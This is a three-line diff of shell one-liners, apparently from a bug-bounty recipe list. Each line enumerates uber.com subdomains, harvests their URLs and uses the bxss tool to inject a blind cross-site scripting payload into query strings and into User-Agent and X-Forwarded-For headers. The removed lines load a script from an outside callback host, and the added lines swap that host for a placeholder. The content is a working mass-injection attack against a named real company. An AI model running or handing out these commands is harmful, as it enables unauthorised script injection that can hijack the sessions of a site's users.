@@ -1,3 +1,3 @@
-subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=https://xss.report/c/username></script>' -t
-subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=https://xss.report/c/username></script>' -H "User-Agent" -t
-subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=https://xss.report/c/username></script>' -H "X-Forwarded-For" -t
+subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=$URL></script>' -t
+subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=$URL></script>' -H "User-Agent" -t
+subfinder -d uber.com | gau | grep "&" | bxss -p '><script src=$URL></script>' -H "X-Forwarded-For" -t
